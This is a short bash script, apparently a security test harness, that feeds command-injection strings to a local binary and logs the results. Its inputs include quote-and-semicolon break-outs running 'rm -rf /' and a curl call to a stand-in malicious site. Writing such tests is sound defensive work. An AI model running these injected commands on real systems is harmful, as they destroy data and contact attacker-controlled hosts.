#!/bin/bash

EXEC="./test2"    # Nombre del binario
OUTPUT="exits/injection_security_tests.txt"

echo "Injection Security Tests" > $OUTPUT
echo "=========================" >> $OUTPUT

# Función para probar inyecciones
function injection_test() {
    local input="$1"
    echo "[Running injection test with input: $input]" >> $OUTPUT
    { time $EXEC "$input"; } 2>> $OUTPUT
    echo "---------------------------------" >> $OUTPUT
}

# Inyecciones típicas de comandos
injection_test "'; ls -la"
injection_test "'; rm -rf /"
injection_test "'; echo 'Injection test passed'"
injection_test "'; curl http://malicious-site.com/"

echo "[Injection Security Tests Completed]" >> $OUTPUT
